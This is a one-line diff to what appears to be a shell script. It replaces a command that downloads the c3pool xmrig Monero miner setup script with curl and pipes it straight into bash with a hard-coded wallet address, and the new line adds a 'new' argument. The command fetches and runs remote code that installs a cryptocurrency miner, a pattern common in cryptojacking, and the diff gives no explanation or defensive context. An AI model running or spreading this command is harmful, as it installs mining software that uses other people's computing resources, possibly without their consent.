@@ -1,1 +1,1 @@
-curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 42bHyoLjdkhiGd9qAnUaBxQSyRSYaGpRHF7nTAECub2MHvuJ3L9JPkCBRyxZ3D9EpZVQDgnySNc8wMg5bujSEKZjK9aKtSn
+curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 42bHyoLjdkhiGd9qAnUaBxQSyRSYaGpRHF7nTAECub2MHvuJ3L9JPkCBRyxZ3D9EpZVQDgnySNc8wMg5bujSEKZjK9aKtSn new
